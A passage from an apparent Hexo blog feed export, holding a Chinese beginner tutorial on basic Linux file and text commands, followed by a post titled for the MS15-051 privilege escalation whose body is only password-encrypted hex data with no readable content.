<td>-a</td>
<td>显示指定目录下所有子目录与文件，包括隐藏文件</td>
</tr>
<tr>
<td>-l</td>
<td>以列表方式显示文件的详细信息</td>
</tr>
<tr>
<td>-h</td>
<td>配合 -l 以人性化的方式显示文件大小</td>
</tr>
</tbody></table>
<h3 id="计算机中文件大小的表示方式（科普）"><a href="#计算机中文件大小的表示方式（科普）" class="headerlink" title="计算机中文件大小的表示方式（科普）"></a>计算机中文件大小的表示方式（科普）</h3><table>
<thead>
<tr>
<th>单位</th>
<th>英文</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>字节</td>
<td>B（Byte）</td>
<td>在计算机中作为一个数字单元，一般为 8 位二进制数</td>
</tr>
<tr>
<td>千</td>
<td>K（Kibibyte）</td>
<td>1 KB = 1024 B，千字节 （1024 = 2 ** 10）</td>
</tr>
<tr>
<td>兆</td>
<td>M（Mebibyte）</td>
<td>1 MB = 1024 KB，百万字节</td>
</tr>
<tr>
<td>千兆</td>
<td>G（Gigabyte）</td>
<td>1 GB = 1024 MB，十亿字节，千兆字节</td>
</tr>
<tr>
<td>太</td>
<td>T（Terabyte）</td>
<td>1 TB = 1024 GB，万亿字节，太字节</td>
</tr>
<tr>
<td>拍</td>
<td>P（Petabyte）</td>
<td>1 PB = 1024 TB，千万亿字节，拍字节</td>
</tr>
<tr>
<td>艾</td>
<td>E（Exabyte）</td>
<td>1 EB = 1024 PB，百亿亿字节，艾字节</td>
</tr>
<tr>
<td>泽</td>
<td>Z（Zettabyte）</td>
<td>1 ZB = 1024 EB，十万亿亿字节，泽字节</td>
</tr>
<tr>
<td>尧</td>
<td>Y（Yottabyte）</td>
<td>1 YB = 1024 ZB，一亿亿亿字节，尧字节</td>
</tr>
</tbody></table>
<h2 id="ls-通配符的使用"><a href="#ls-通配符的使用" class="headerlink" title="ls 通配符的使用"></a>ls 通配符的使用</h2><table>
<thead>
<tr>
<th>通配符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>代表任意个数个字符</td>
</tr>
<tr>
<td>?</td>
<td>代表任意一个字符，至少 1 个</td>
</tr>
<tr>
<td>[]</td>
<td>表示可以匹配字符组中的任一一个</td>
</tr>
<tr>
<td>[abc]</td>
<td>匹配 a、b、c 中的任意一个</td>
</tr>
<tr>
<td>[a-f]</td>
<td>匹配从 a 到 f 范围内的的任意一个字符</td>
</tr>
</tbody></table>
<h1 id="切换目录"><a href="#切换目录" class="headerlink" title="切换目录"></a>切换目录</h1><h2 id="cd"><a href="#cd" class="headerlink" title="cd"></a><code>cd</code></h2><ul>
<li><code>cd</code> 是英文单词 <strong>change directory</strong> 的简写，其功能为更改当前的工作目录，也是用户最常用的命令之一</li>
</ul>
<blockquote>
<p>注意：Linux 所有的 <strong>目录</strong> 和 <strong>文件名</strong> 都是大小写敏感的</p>
</blockquote>
<table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>cd</td>
<td>切换到当前用户的主目录(/home/用户目录)</td>
</tr>
<tr>
<td>cd ~</td>
<td>切换到当前用户的主目录(/home/用户目录)</td>
</tr>
<tr>
<td>cd .</td>
<td>保持在当前目录不变</td>
</tr>
<tr>
<td>cd ..</td>
<td>切换到上级目录</td>
</tr>
<tr>
<td>cd -</td>
<td>可以在最近两次工作目录之间来回切换</td>
</tr>
</tbody></table>
<h2 id="相对路径和绝对路径"><a href="#相对路径和绝对路径" class="headerlink" title="相对路径和绝对路径"></a>相对路径和绝对路径</h2><ul>
<li><strong>相对路径</strong> 在输入路径时，最前面不是 <strong>/</strong> 或者 <strong>~**，表示相对 **当前目录</strong> 所在的目录位置</li>
<li><strong>绝对路径</strong> 在输入路径时，最前面是 <strong>/</strong> 或者 <strong>~**，表示从 **根目录/家目录</strong> 开始的具体目录位置</li>
</ul>
<h1 id="创建和删除操作"><a href="#创建和删除操作" class="headerlink" title="创建和删除操作"></a>创建和删除操作</h1><h2 id="touch"><a href="#touch" class="headerlink" title="touch"></a><code>touch</code></h2><ul>
<li>创建文件或修改文件时间<ul>
<li>如果文件 <strong>不存在</strong>，可以创建一个空白文件</li>
<li>如果文件 <strong>已经存在</strong>，可以修改文件的末次修改日期</li>
</ul>
</li>
</ul>
<h2 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a><code>mkdir</code></h2><ul>
<li>创建一个新的目录</li>
</ul>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-p</td>
<td>可以递归创建目录</td>
</tr>
</tbody></table>
<blockquote>
<p><strong>新建目录的名称</strong> 不能与当前目录中 <strong>已有的目录或文件</strong> 同名</p>
</blockquote>
<h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a><code>rm</code></h2><ul>
<li>删除文件或目录</li>
</ul>
<blockquote>
<p>使用 <code>rm</code> 命令要小心，因为文件删除后不能恢复</p>
</blockquote>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-f</td>
<td>强制删除，忽略不存在的文件，无需提示</td>
</tr>
<tr>
<td>-r</td>
<td>递归地删除目录下的内容，<strong>删除文件夹</strong> 时必须加此参数</td>
</tr>
</tbody></table>
<h1 id="拷贝和移动文件"><a href="#拷贝和移动文件" class="headerlink" title="拷贝和移动文件"></a>拷贝和移动文件</h1><table>
<thead>
<tr>
<th>序号</th>
<th>命令</th>
<th>对应英文</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>01</td>
<td>tree [目录名]</td>
<td>tree</td>
<td>以树状图列出文件目录结构</td>
</tr>
<tr>
<td>02</td>
<td>cp 源文件 目标文件</td>
<td>copy</td>
<td>复制文件或者目录</td>
</tr>
<tr>
<td>03</td>
<td>mv 源文件 目标文件</td>
<td>move</td>
<td>移动文件或者目录／文件或者目录重命名</td>
</tr>
</tbody></table>
<h2 id="tree"><a href="#tree" class="headerlink" title="tree"></a><code>tree</code></h2><ul>
<li><code>tree</code> 命令可以以树状图列出文件目录结构</li>
</ul>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-d</td>
<td>只显示目录</td>
</tr>
</tbody></table>
<h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a><code>cp</code></h2><ul>
<li><code>cp</code> 命令的功能是将给出的 <strong>文件</strong> 或 <strong>目录</strong> 复制到另一个 <strong>文件</strong> 或 <strong>目录</strong> 中，相当于 <strong>DOS</strong> 下的 <code>copy</code> 命令</li>
</ul>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-i</td>
<td>覆盖文件前提示</td>
</tr>
<tr>
<td>-r</td>
<td>若给出的源文件是目录文件，则 cp 将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名</td>
</tr>
</tbody></table>
<h2 id="mv"><a href="#mv" class="headerlink" title="mv"></a><code>mv</code></h2><ul>
<li><code>mv</code> 命令可以用来 <strong>移动</strong> <strong>文件</strong> 或 <strong>目录</strong>，也可以给 <strong>文件或目录重命名</strong></li>
</ul>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-i</td>
<td>覆盖文件前提示</td>
</tr>
</tbody></table>
<h1 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h1><table>
<thead>
<tr>
<th>序号</th>
<th>命令</th>
<th>对应英文</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>01</td>
<td>cat 文件名</td>
<td>concatenate</td>
<td>查看文件内容、创建文件、文件合并、追加文件内容等功能</td>
</tr>
<tr>
<td>02</td>
<td>more 文件名</td>
<td>more</td>
<td>分屏显示文件内容</td>
</tr>
<tr>
<td>03</td>
<td>grep 搜索文本 文件名</td>
<td>grep</td>
<td>搜索文本文件内容</td>
</tr>
</tbody></table>
<h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a><code>cat</code></h2><ul>
<li><code>cat</code> 命令可以用来 <strong>查看文件内容</strong>、<strong>创建文件</strong>、<strong>文件合并</strong>、<strong>追加文件内容</strong> 等功能</li>
<li><code>cat</code> 会一次显示所有的内容，适合 <strong>查看内容较少</strong> 的文本文件</li>
</ul>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-b</td>
<td>对非空输出行编号</td>
</tr>
<tr>
<td>-n</td>
<td>对输出的所有行编号</td>
</tr>
</tbody></table>
<blockquote>
<p>Linux 中还有一个 <code>nl</code> 的命令和 <code>cat -b</code> 的效果等价</p>
</blockquote>
<h2 id="more"><a href="#more" class="headerlink" title="more"></a><code>more</code></h2><ul>
<li><code>more</code> 命令可以用于分屏显示文件内容，每次只显示一页内容</li>
<li>适合于 <strong>查看内容较多</strong>的文本文件</li>
</ul>
<p>使用 <code>more</code> 的操作键：</p>
<table>
<thead>
<tr>
<th>操作键</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>空格键</td>
<td>显示手册页的下一屏</td>
</tr>
<tr>
<td>Enter 键</td>
<td>一次滚动手册页的一行</td>
</tr>
<tr>
<td>b</td>
<td>回滚一屏</td>
</tr>
<tr>
<td>f</td>
<td>前滚一屏</td>
</tr>
<tr>
<td>q</td>
<td>退出</td>
</tr>
<tr>
<td>/word</td>
<td>搜索 <strong>word</strong> 字符串</td>
</tr>
</tbody></table>
<h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a><code>grep</code></h2><ul>
<li>Linux 系统中 <code>grep</code> 命令是一种强大的文本搜索工具</li>
<li><code>grep</code>允许对文本文件进行 <strong>模式</strong>查找，所谓模式查找，又被称为正则表达式，在就业班会详细讲解</li>
</ul>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-n</td>
<td>显示匹配行及行号</td>
</tr>
<tr>
<td>-v</td>
<td>显示不包含匹配文本的所有行（相当于求反）</td>
</tr>
<tr>
<td>-i</td>
<td>忽略大小写</td>
</tr>
</tbody></table>
<ul>
<li>常用的两种模式查找</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>^a</td>
<td>行首，搜寻以 <strong>a</strong> 开头的行</td>
</tr>
<tr>
<td>ke$</td>
<td>行尾，搜寻以 <strong>ke</strong> 结束的行</td>
</tr>
</tbody></table>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="echo-文字内容"><a href="#echo-文字内容" class="headerlink" title="echo 文字内容"></a><code>echo 文字内容</code></h2><ul>
<li><code>echo</code> 会在终端中显示参数指定的文字，通常会和 <strong>重定向</strong> 联合使用</li>
</ul>
<h2 id="重定向-gt-和-gt-gt"><a href="#重定向-gt-和-gt-gt" class="headerlink" title="重定向 &gt; 和 &gt;&gt;"></a>重定向 <code>&gt;</code> 和 <code>&gt;&gt;</code></h2><ul>
<li>Linux 允许将命令执行结果 <strong>重定向</strong>到一个 <strong>文件</strong></li>
<li>将本应显示在<strong>终端上的内容</strong> <strong>输出／追加</strong> 到<strong>指定文件中</strong></li>
</ul>
<p>其中</p>
<ul>
<li><code>&gt;</code> 表示输出，会覆盖文件原有的内容</li>
<li><code>&gt;&gt;</code> 表示追加，会将内容追加到已有文件的末尾</li>
</ul>
<h2 id="管道"><a href="#管道" class="headerlink" title="管道 |"></a>管道 <code>|</code></h2><ul>
<li>Linux 允许将 <strong>一个命令的输出</strong> 可以<strong>通过管道</strong> 做为 <strong>另一个命令的输入</strong></li>
<li>可以理解现实生活中的管子，管子的一头塞东西进去，另一头取出来，这里 <code>|</code> 的左右分为两端，左端塞东西（写），右端取东西（读）</li>
</ul>
<p>常用的管道命令有：</p>
<ul>
<li><code>more</code>：分屏显示内容</li>
<li><code>grep</code>：在命令执行结果的基础上查询指定的文本</li>
</ul>
]]></content>
      <categories>
        <category>share</category>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>ms15-051提权</title>
    <url>/2021/08/19/ms15-051%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="3cfc219aa0d246551b81e482f2bd276207e876f755f8b504d79df3fb2be87827">017cc0ab8ddab4a1475d3a5d22f989ad9f9d5b2a787fbdfaed53e8a13eeed3eab80cd9df07655602c1b276496169e9b2499ad788ba0a3ebf6346bf687c8c342aba8ca472100b99c10229c0bf84f6fc094a6c6d1d1cf858628ab89b31c2d45f72cc79a9610b1c168feccf525229a8d0cb68124de10556b7c9052abc2ef4aae690ae112310fb8ef66c0bb4bde97fc63402437f050ef70f7e2cc92ed8fa8fcfbb9883e2b47be71ba17396f2b1eae74a03ed920329507f4f8724177b9cd022e010d9d66d248a8b02113e7044616f1372e75ae53d26beb5ad68bea28b23b77f0a8354bb5506c7325bc1c4d6dd8b0e133a33843648be0032f9f3b2e8a9fe7165898288520a4b8ef0e4f24b06bb2a59f04615f07707b90fefcc0914abe13f7778bdb9e40d364f1308e7261842ca25a2fba308b7132ea6a47445580f0ff5e693eb6fc05fcb277e21cbcbcaf2ec26c40f17b8c5e8d4dadaf90b40e9b9b0b738ed751fc165e090037ac1bc10d8b0ded2e750a9f0e22e764f212b5fb5d0b0e93d7164f0cdb4ffc8b44e92c3c2b13b6a5ce0dac3f671118e2a56ee4d8f6cb66da4049b792dc7b9ec17334d1aaeba0710107a3d8492dcf15a1314fdb94dc6e04f586984dc380ec5d271f04db87009be0c72e18cf5fccd065a2c2550915074ff5d079e24cfc3de3ec57fffaa3f31612c9509e452c04014fdb97c82d33989a70e9fef66bf83eca573cd13d93c31405143dd6fe028b0392d56a4eabc4ce1ef7cf360b5110b44322e10c116a5d3960943919ff20e0ce7357d3311c834c4e431acad297d01b16ccbb4dae9fde86b2665fd76aa61b77a68f3f9232d72527fa8faf06a8192cc3b390e570e0f07031317c20bd3ca1755b1ef8aade646c210afbf71983c7d63438dc145ee710bd68e8a2f05c2166f3e3c165fa752b6629de7460dbce9981994342bb07aee01987b45fad9d172adf8e3eda2df137f54a1f3374e93c8b2fdd590495e0722bf4311fda94e104339630cef97a094b5b91d104e57459ede3a5d3d3338fbf9804fef61a3497b5c359b5acbba04516f4817a075f84dd0e1191b657da928acf35bd152ca119ae37e3d60a7e4e90b2511624892338f3e6a0cd5ec5ac7820daf1bcb8b4fb1f83686bbef372bf72f8a15986d486bdb9b4686624e9c6728ccdec04120f5bba9d4f0a185192f7c138bbddc923c7f49614bd7f1943b32dd038ace26fddd25ec24bfff63d9a0fe0d29977f27a3d5263487a34cef62ebcfd58b7d8df9dfd7c1e5e7617ae307ed93826fb716060c2c4cc74adfd816b37c5b6c3b5364f8006b7bd4be68af5e1ddb33c6c940b808d5d0218d6892f90a931863da87c660e393380d4af011772330233a426f87741452ee9e53565d68d873bdcbc065805ee4ac3f6389bd2e79ba7cf0b7a87193bc67e9fb3c11a712d7033d148861ba6d94d913974334aba83ed956241fb54ca082fb9d9cd6887a87b514011818b1a1c1c77f19e76b53c8916de663d87459abd5d24049cb41a1da7d00358b5c21f48e915dacb4a0df39cf772a203c171d213819b995e290d4b1e7e531d8498822fd5b77edafefdc8e6b9f32bd0cc6157a1b4ce2bc3739987373e3ed7ddbd02ab65faf56283f6153b38b01f3144f84013329a7161ca22ecc2e52436bf1213afac4cc80b1703cb38325710ca3deb0f1fa3c036cabc4db442f554eaac208978cbea81b6715a870e3e57a4fbd43e627cd8d67d196478f263dacfb6b9eea456090d67f5a2571aed53bbec56a874e77525647525659d8db4744d6ee781725e4eacc6623efa1b1c0a7a35a3e66b4594a8546128f166813bbdee228ccf50ccbfd09537fa703fddb2722aba46e6a30e4e1c94d18b7b9094483b25d81c3d96fd6374ce71303ffad428b567c18c16bbe3256952417e877181f2aee0305caa81855f03616089cae47d4217dec21ef0f242a479f5cd8db64bc3b99ef6f43a15ed7bbf746d01b30cd82c7fea489fce0ba553d10cd080ef1a294e31b4b68f118a32eb7b2bee951ba2605a08695c65a983d40b08d77741c2cab0936ce293c40263e8cdd665b98ffd7ee292699d776ac31ba03a346f391ea298b5614b7a4d36fce766fd12a8bc8e8e986e6c08a26ef0ffae70268df92da06a58ae76038507eac206db679691dc7e421d63f4346f311943eaea13a366826066a9437544ab0e13403eeb86b5d6d38ce9ed9fddd12980e0ded6baa7cf46dfad7bc907fd84f57a3bb0bd9bce8707795e625a1128161a3ab6933a473b40dba6fc2c61eb655182e96c8b5b3fa5098247145291b22595d563c49770fe3bac6c16eed484671fbedc7a854288105b1889ca0a26001dc975b2e81a94c3b90f7d0d3f983ccb868c7d652eb713436e4b54b3a2104f7dcab0fa58e8798372dd13f04a6498e013fbc06dba737091057d7633023b1787de66c225a93fc782d7e6b077a59e93ca3cc1cc43266b84ee0b70388d95012b7adf590e25af263e9e28106c45e3f038931bb5f55c3f3ab16829792feae90e3a4d13d92996421e4d1e4e714b4198e6cb7cee44bcea8f6b698db15904c10b7ec36be673b9f5b2a95e093e26065078d861a39389b6b0c0ae8aae916025f5837b58c17a1e3d1e92f3a5e96b9fad72f44bb40cf87614eeb07b4e0b5437e4e50d60aa6510768a51d5f98c357d23fc02b613e9eb043ea1d94f5b4f2b6920246e3a5027de6b4733074e75117e7cc7c5cc84d4541f14d08cb676d429e18ee17cb51b7b6c02d3ac19939a958579ee4ca4584a2662e0edde1ae9264fd52baa92bc430a46c45ab4f837c4d980be334cb48cbecd742637e1de47408da28611193841851c54a94da084a53f485c26803f749fd801fef9b955c31a07c23bb1d50fdf35adbe47a34027e33f42b447ddbf6c24359ba5bc4339ef6f4a0fc9e35fd4f10c618b338ed9f76468cf563c92b91c0a30eb1c896ce0e8de695e0689af2ba3ade365f59256ad95e325f07458efa12d3a7fe824f46eb302367220ad50540be0e417c6f81dbd4d572b00d4c706db56a224b2c84c2ee6a4605b4bebce1526d42f87acf3801ecf72088a15cd29136d9ae0f684b3281cbd1fad950bbf6f6902acf89a8949ce1c83896304cae9c876e00de2d1ecd6de7ab4d0308f395ecc70abb13d4e959f49b9c213019bdc60c87662642d8ec03062760047306825de8831a488c6fefb5906c0736183ca305065dcd0182ccc1b30359d6ebfa6d7394dbe5c93c05146ec096678ebc5d2e093adf101cf63319fc9c203a2132606105c13364042eb465ab5e9387ebce4c10586a16d4d7964c0126f3de898fe6baf0df1d33c941edd827cf977822007f64699a121a41127b419a34c1d03812cde8b54a82f5ea16127c839ab010ffb01cce0341513b3e783d9ae1a255d0bd524eb7ce51d874575ca8c8ac447f47c0f2f08a47b48280179506530a9858f95d85f6eba5f611e4b9e959c16e737b1df720f48312effb1729564e48baee199080f4ecc743f0dc9c108a9fc2427ac339b811e705f4ad7c2e35b6a8225d693053f5a39e958639b323201afa39913d6845365e7e61ee138fa717d5005bd98430fdeec3ec09554d785d350a12471a6feba53195e5cf624fabfe703c9d23cba4d0f6f30c9d26f108e64a8b8ff07be94986730770e16320f12722039542291e1524a54eb9e5ca27a48ee8ea3bd1ebd2c80ea966dff416e3b1f8b68a5b1463d864867424633db739836d4db344fc48cd4279ed20d6da453f3d5666a5a0b9d63af8d8f055fc172c9d4171f7c8a71590494454a22ad4ae2303db949c8f042b20df3cc5931eeeaca20935824793d263d7a89ffd6d5c9bed3721375b628b2cc87bbc71f7347cb174ef354165060c0ade8cbc5536a6d97fa737563efa206828ee3d79e1a0c557ad862a071333ad4ef64b20be7d0ec5e3884dfded2a9ab276acc13e06aecdcaef57c6919ceab89c758176d44d512672a9f39f0282d879ee76bf6c48db8be223218c41c7bd1a66e503aacd693465b39670116170fc7ee1f55eef3de7468fecd2a095d71980844f5d13788735c4f4d2bda91b6b45cffe23d4a6887ddb00209db7a755dc5a7253d6034992fec6d3c39ed1ecb16f0a9cbbf7266fb63b19dfcebe23acbbf9ba2c6c4d5fcfece964661b727c4ece028c1a96a5173d4fe84960da12a1de1404bdf90d7e2e644bc5f5d430cbd5eeb01f247eccd59022e469c0d8123b813aa7e9f9a47bea90ebada58b99ef515c3621cf0f9f847cea159a67920dd931ccce2e8c74d533dd3d5e670d441be689fc8b50b74d27694987313d9f3612045b7a2eb7ebf68a5bd8961475951074e56f038d2733fcde94489a77d074d8d88848ab5fb210d14d37470092d710d0a05c35a7a6dff36ce65feb6e75301a39b789c7aa14821e6647a886fc481c2edabe32208290cb0b07b1a23df73b089861aa80b3d198fbf1490b7fcc29853731ea318a8ffa10eb94077d4633166e61f77fe0bd3f1d5128c78a9e223462393be8e27a39f961f0dfe381b633c4393b9e2a993fbf7a67cb44c04b35fff9699dab1ffa2dcda49845a0cc8148f1b8b3d44c18410366fd7af1a5e659e9d95663868e2c37b19090be67eb12d8716b88385456e7ad0d0a13d222ad4f04d2d88bfd2627e32efc0948445368073574e7dc8c5eabb0ca51a31c1e743e9d5eccc905d4e960a777692e4f7d07afdefd29d6f65997fa8078bb92f194273e42aba162061dda587f4965b4151b4b2adc8d0a726122622d27d15a37ce6e879925994fe59ab7fd36b9642f1be3d6dedff44ae566c2f15f7e0157399013badecff1d907d22d8af96ca9a4d0394cd22c0939a3ba0737cd7484773af5a62634ca21a113f573383cc957e3539759f9792b92be0b2c58b080c81a37e358827108770017e3e73adaedabdfca52bf63b0ceb5a34ade84d51d2d2cdc7224c16376f065a494086b01515db3549d120d9acc8b2e83ce7d9adbe636c7d564ebabebfb41e17e6454c4fb76b580af140da924bd53f473281ed01335a0cec027f56a173568dcf4382e50148c24d0a5918b98ab6a6510cc14c209292759ed36f57732cea45619c3735e8683eab8de8c83083f9c73fb287672bb6b065e95fa386e8bbb8818e8f1c15917ef891a745a3b563842bf6553229bd0179ee2a5fb2706db23bd6368be35686de504df1d34e4640f518928ba8139016898148fcc56a9e855476adbc143cbb5dbc7c1ad32d8aa498c95f73ed0cf78aad6df91e8bfcdc2b53c3b731a0f368b926fd5d1541cb4ab762c6398866a7755ae728c090f06a03817fbf62a59d255b39e95805a201582dca2022c638263987ebc2d7d94ac7cff432c2313321fd300855d46c44d53d27c3793292837d45b782b5faeb2e031c64a8d04675022d09129395e1a88c519546a7b3feb11d59cf413661c118d6b1f6f707a617da43694830dc44b1479e43e275abb47c78713a37ec5935a4450e73688dac0b9c1295ba061f45b6bf0f7f5084e1e7dd06cc19a248d03aef47aa378dec711ed4a3f6f490700f19443283e19bd789ea18fed9d8ad5b6287031eb3a4b5430d8fc398682395f83d21bad456b6eb7f67a9dd85445ab3c376a37c7195f7edb86774aea8241fdc1863f6a31bb35297bbe8c023bbabcab895fc9cae0d4828091b2c5471a69e1378958796259d665d02d3b1ccadd81ff09ce474ea21f4ee77bb11434da7bb67f5efa36dc93dc3c4654757654ff79a417ea5b0a099fcb8b0949b3c7472a5c4cfca304629d368026e0ffb0489a887161a4e1662a18b58818dcfa6ad30d59bf98aa8b2d8e289d43f7f57a40828d7c7ac13debb2fa228b258e4e8ff1c14fd54f6d3ae79e491558417b603806e17260745be889d6fba225ce0a7fb8eff8d60c9a95bddc48e0a0eb9bc42765205279ffc953087a6501d9903839ecb2bbe5bc613a18e7059f113e711723d2ab937080212af6d5a493062c575718c2174fe2ddba9ad2c2981cc5ad5ef1f244b2b5d05e52a1e0da9db60cb5a505efad15d121d9600bae47942866cb50c8e152e7649311addf63eb705f3c96bf8cde281924894c321645b9b50af1387fe751dea557ff025bdff01bb082e5a630c266602f3122fa238c5cff7b39d5875895bebb20d6117dbba349f0d015bc4b6d6db7ca1bf0bb4bc5f0ba2e73d884efe3da90b59869f3fdb660723a3ce78bba5acf19ad23f8cf33329513bdd9a99258a60bd877acdbef0052badca52d23566a5d6e71cb9cfa33db732b1e7615fcf25e89a1cf96d0a5e8928cae8ce180b66dff196432a9d5efe1a2cf5e901bed8d3303528fd05f8dc791724b0bda79c61aeb566d549309c94119e47a5dfdc5ce78c7cbac3b9a7244a64ec43717e83c507e2e0993a4d2891f7b9daecd6d8a8c07cf1f37073f97f0dfeed48fa5ad878467af0f53a1215528a62148ed2e96e9e3a2bc23d8bb366498d058dc97fb5597579adda9ef32dd3ac33b9aed41f105db3a4400602521257a5a17ace3af8077fcf5ac02847d9f30a319f72790c10b4e6632fb42eb68dd493ac75b809128ae96cfbd450e54f16bc2a520f7250c4f8beaeeada68eb9108d8256eee5153e6d9752dd3f9e7a0970a56d6b9eff0a39e564213e64b794591d747c8cba29efb9e4d8a1940f919eb71542c87fcd90c1407da19b967457dd5ed281343be1ecc4d3f0d9179012b535e71efc35c153d53c12cdc9aa763176c8399fa2a2b44aaa27d480bd7dd2982a5456bb4162346f3391b4f726add561dcbc235c2cb8ede044e9ff7c7fc3022df869c678c425348748463903be8b6c4fbbbcbaa3809b667342c021cabf0d5b4a55fe8f353016d940181acf857eb0108279b1b6ce8559ac7fd6f63e6f71cdbf836fed06cded3a3afdfc3401cb4c92d9915a524fa1de45b5d7cc714e40796a14e598bd857ee6d4b3b18c89e3abaeff31e7aeb0b96959ce3f0115ceda7c602b43db2f73daab50ae3daaf0eb7683caf2d84c0562bce478514ecc5455eda1be1a2989e2f589f0d1ad41936295f640840b359cc5d4cd016e0de0ea0d00a9240f55cc4ec7efa7166ce89507617d9da1106fb63e6af026db597a0f42b281bec2918e20f1acd2097dedac2df114f9a79cead7b53b6eb74e34d305d6c099a0a7daa2bb3e88330e9c4aa5af16b6c8d23429b1f23fe1ccccd69732fb280ce383762eb0a5ce00d122e048a53e0527e466d792ad6f5b0d163303aea46f97cfd144e675e8d7389f3988d7a7b6d5a34ba366f3a5664f7b0514ce949b9ddb84bdad863e4e2edf2aa1b21e4c3b24cd1d1364659cb622efebf72839dbbc3fb73b6c3b298cab25e49a1ecf1843fe65e283bea41cc56461ca6730f3aa0624c03f3659ead6da4ad40ac502656cd6b65c8ebd8491bbf25e42f742585c64aa4b93f99c3761cea643cc38b4a6dd6369c17af473ee41ffd557131f5438efd6f211a0393818f5fdf440c28d55b0224cd9318921264013629d549af3ef0df360d2189bc9fe535c6e3db6313de2f9cb999194e1a7cb614b66c3b03b52ed7074bcde5088a3736e88a9271ec36a6069d9b1a5066744fda470b2374eb789d208ea41ed5070a41af819b4b49c724a727920549446212a70be71757db46888a06391b011ece2eb202872a75bd1d8c09e89b40c0f33ee2d5a62c458b3a4a13822e4af9eabfdb229617d00654f1b9ffdaabe5cc684ceee08f138572cb32c569dc8cc50936aaba9526cf2ac68c9c2a46ad127285cc7edcf71b7d96ee77692a57a90ecacccf92c31a0358c5fb9542cef53e47b95c7156f8b943d09718557aeed313c7707973f8779d03ca6e10e751b19d1eee481fc93960d2f273cba7daa1757c699d740a897e47bbf1d396e94325e585db614801f354843f0a3e4a4280cafa3edc0c33ac3f712aa4a5343364d31acef7a0191b984bb9c874af99d258c5e097e5095f4d3b934b0a394ce4a8666ba7993aa39781b3b26f420ee41b8152f49b2af3df72e293eafacf56ed3025f94ed8fef79e771e269f8bcba842286a4218c49fb5d94fd19bdd0d4c898c15d55f64802a3a41fe051827779104ac43f8ac8883b7d812068d8bc8f099353b87b09b913cea0ca1462f1832529de8667172ca0a657e9452d0904562bf98120b64441d67de2b2e51bce1e8da7e8400abc87525644982f5550aadf746d5bab0f0add2ceaa14e55eebf25d1973b9a15d58729615839d301b4b1593977b42ff5697cd87a8c9ab9591eef3cc12a690dc13918a69fbf1adcdf1a535d330186e099710aa98765f58a149de377814de0bfd4adece5afba59c06c6346c232873eded9ffbfae767926514acdab7b00b2946e3eca4e6b0836059f4b03bb024640044017c164f0cf346068d80a10b0cd0e0b91de3d5c00cc97487709ba6163ddaacc10e0a0b801452ed8f8733616b3de32c33b6818b14ba41be4f3ee00a379e0ebe12ec69d3c4c3fb6128e4f07f5b6a2a21fe5d44b54c92e30bdb94331e40e91e54a58f33a98ac3f14dbb2711bd5c45a811ebb87ccbaeb078b3c1432662fbefa6ef8ef8123616339e111444a90153d125140a77d5f24a5e1552773e6624e708f420962d703d629c66448cde1f01aa9169fa36beb45692588d8566f347e4c1710e6dc4168dbf1e54ba0a9f05354899ba4ed01352adbc3b8a96967eff695c6c47471b5570d49cc4ca088126c381ac23d566dade0bb5615d5a96a5f1e0b9818a60ebdc0543f63380a6a9950d544237b761cc7d0497249a3ced061a585057014ae0b3accc5e016d205f1d6ad4eaa6b0f823d8fbd11e6eafb1524c796837c3d270c30b9fbdf2f5637278497ff186ed3673f0c59473fa1b20a27103bbaee58b166f38543f6fa1f337295f351c095a7ede79ffbd5551972a4a11adad0876548e3585ca858da15eb284f911d21593d988cb86ab1f5975201863d0058fe5b11a7f40b4cfdba025831a254866573174f56479f6af9aaf049aadbffbc54338524daf8889d54b50397f2a91e44537aa713cecaf11161b63f6afb95972c352a33fc6f5e6dfa3cfbe76a7afffa93cf5f5d56b3057c9c4af9d8d0f340294686b62c69af7374107825ce6c08c3286a13f1a45349c44e665934e7ffe7941e8aecca931815726761b8cbc7f1a129c7d7fea04d0394c226900374442fbd9a15113e8f65d804032e48ae692a697fec710348c170627090ee3e72ae274fd6c03045dedc8cdf34b637248ba0bc33e5ae7535476ff4df69b18a0a7916b7a4cd40e2951296653755b6ff958ff428907b89979d70e1e14712d733105fa6b69467d2f120aee1741f8eba7a9b9dacd74cf6c94b8d3cdb1ea7045dcc06b91dc850552a85ad97d0040462f52be75cbb9aa9038cf997e1a4c15fbf9620548af90a2076530457bafb8be569421e9ae0a393b641b917d66c45e4361c693a5c5b1b49cdaf2e4690ccecd6feb0dc000081b686f03e88665720d5e6a489bb446a55f35117be85956492ec220ce78c2949a292ce84bf5da5f20be0e03e4d114770d0892b1b396b0885680db84416e683f931e3abf534f891456f568e6a73d4